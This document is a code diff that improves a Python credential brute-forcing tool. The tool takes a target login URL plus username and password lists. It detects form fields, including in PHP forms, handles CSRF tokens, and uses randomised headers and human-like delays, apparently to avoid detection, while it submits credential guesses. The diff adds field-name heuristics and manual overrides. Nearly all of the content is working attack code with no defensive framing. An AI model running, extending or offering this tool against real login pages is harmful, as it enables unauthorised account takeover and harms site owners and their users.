@@ -1,3 +1,4 @@
+# Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common web stacks)
 import argparse
 import requests
 import random
@@ -41,29 +42,41 @@ def human_delay(jitter=0.45, base=0.7):
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="Sophisticated HTTP/HTTPS brute-forcer"
+        description="Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common stacks)"
     )
     parser.add_argument("url", help="Target login URL")
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("-l", "--login", help="Single username")
     group.add_argument("-L", "--userlist", help="File with usernames")
     parser.add_argument("-P", "--passlist", required=True, help="File with passwords")
+    # Manual override for field names
+    parser.add_argument("--user-field", help="Override for username field name (for tricky/PHP forms)")
+    parser.add_argument("--pass-field", help="Override for password field name (for tricky/PHP forms)")
     return parser.parse_args()
 
 def detect_form_fields(html):
-    """AI-powered (heuristic) form field detection."""
+    """Heuristic form field detection, improved for PHP forms."""
     soup = BeautifulSoup(html, "html.parser")
     forms = soup.find_all("form")
     login_forms = []
+    # Common PHP login field names
+    USER_CANDIDATES = [
+        r"user", r"uname", r"login", r"email", r"userid", r"username", r"user_name", r"usr"
+    ]
+    PASS_CANDIDATES = [
+        r"pass", r"password", r"passwd", r"pwd", r"userpass"
+    ]
     for form in forms:
         inputs = form.find_all("input")
         field_names = {"username": None, "password": None, "csrf": None, "others": {}}
         for inp in inputs:
             name = inp.get("name", "")
             typ = inp.get("type", "")
-            if re.search(r"user|login|email", name, re.I):
+            # Username detection
+            if any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in USER_CANDIDATES):
                 field_names["username"] = name
-            elif typ == "password" or re.search(r"pass", name, re.I):
+            # Password detection
+            elif typ == "password" or any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in PASS_CANDIDATES):
                 field_names["password"] = name
             elif typ == "hidden" and ("csrf" in name.lower() or "token" in name.lower()):
                 field_names["csrf"] = name
@@ -122,19 +135,32 @@ def random_headers():
     }
     return headers
 
-def brute(url, users, passwords):
+def brute(url, users, passwords, user_field=None, pass_field=None):
     sess = requests.Session()
-    resp = sess.get(url, headers=random_headers(), timeout=10)
+    try:
+        resp = sess.get(url, headers=random_headers(), timeout=10)
+    except Exception as e:
+        print(f"[!] Error connecting to target: {e}")
+        sys.exit(1)
     old_body = resp.text
     form, fields = detect_form_fields(resp.text)
-    if not form:
+    # Manual override
+    if fields is None:
+        fields = {"username": None, "password": None, "csrf": None, "others": {}}
+    if user_field:
+        fields["username"] = user_field
+    if pass_field:
+        fields["password"] = pass_field
+    if not form or not fields["username"] or not fields["password"]:
         print("[!] No login form detected, exiting.")
+        print("    [*] Try --user-field and --pass-field to specify field names manually.")
         sys.exit(1)
     action = form.get("action") or url
     method = form.get("method", "post").lower()
     if not action.startswith("http"):
         action = requests.compat.urljoin(url, action)
     print(f"[+] Login form detected at {action} ({method.upper()})")
+    print(f"    [*] Username field: {fields['username']}, Password field: {fields['password']}")
     for user in users:
         for passwd in passwords:
             data = {}
@@ -179,7 +205,7 @@ def main():
     else:
         users = load_list(args.userlist)
     passwords = load_list(args.passlist)
-    brute(args.url, users, passwords)
+    brute(args.url, users, passwords, args.user_field, args.pass_field)
 
 if __name__ == "__main__":
     main()
